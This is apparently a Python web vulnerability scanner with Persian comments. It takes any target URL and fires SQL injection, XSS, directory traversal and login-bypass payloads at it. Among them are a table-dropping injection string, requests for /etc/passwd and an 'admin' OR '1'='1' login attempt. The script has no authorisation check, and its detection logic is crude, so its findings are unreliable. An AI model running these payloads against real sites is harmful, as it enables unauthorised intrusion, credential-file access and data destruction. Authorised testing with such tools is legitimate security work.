import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# URL هدف
url = input("Enter the URL of the target website (e.g., https://example.com): ")

# بررسی SQL Injection
def check_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR 1=1--", '" OR ""="', "'; DROP TABLE users;--"]
    for payload in sql_payloads:
        response = requests.get(url + payload)
        if response.status_code == 200 and "error" in response.text.lower():
            print(f"SQL Injection payload triggered: {payload}")
            return True
    return False

# بررسی Cross-site Scripting (XSS)
def check_xss(url):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    for payload in xss_payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"XSS vulnerability detected with payload: {payload}")
            return True
    return False

# بررسی Directory Traversal
def check_directory_traversal(url):
    traversal_payloads = ["../../../../etc/passwd", "/../../../etc/passwd"]
    for payload in traversal_payloads:
        response = requests.get(url + payload)
        if response.status_code == 200 and "root:" in response.text:
            print(f"Directory Traversal vulnerability detected with payload: {payload}")
            return True
    return False

# بررسی قابلیت ورود به فرم‌های غیرمجاز
def check_login_bypass(url):
    login_url = urljoin(url, "/login")  # تغییر دهید به URL فرم ورود واقعی
    payload = {"username": "admin' OR '1'='1", "password": "admin"}
    response = requests.post(login_url, data=payload)
    if "Welcome" in response.text:
        print("Login Bypass vulnerability detected.")
        return True
    return False

# بررسی اینکه سایت در دسترس است
def check_website(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Website is accessible.")
            return True
        else:
            print(f"Website is not accessible, status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error accessing website: {e}")
        return False

# بررسی آسیب‌پذیری‌ها
def perform_vulnerability_scan(url):
    if not check_website(url):
        return

    print("\n[+] Checking for SQL Injection vulnerabilities...")
    if check_sql_injection(url):
        print("[+] SQL Injection vulnerability detected!\n")
    else:
        print("[+] No SQL Injection vulnerability found.\n")

    print("[+] Checking for XSS vulnerabilities...")
    if check_xss(url):
        print("[+] XSS vulnerability detected!\n")
    else:
        print("[+] No XSS vulnerability found.\n")

    print("[+] Checking for Directory Traversal vulnerabilities...")
    if check_directory_traversal(url):
        print("[+] Directory Traversal vulnerability detected!\n")
    else:
        print("[+] No Directory Traversal vulnerability found.\n")

    print("[+] Checking for Login Bypass vulnerabilities...")
    if check_login_bypass(url):
        print("[+] Login Bypass vulnerability detected!\n")
    else:
        print("[+] No Login Bypass vulnerability found.\n")

# اجرای اسکن
perform_vulnerability_scan(url)
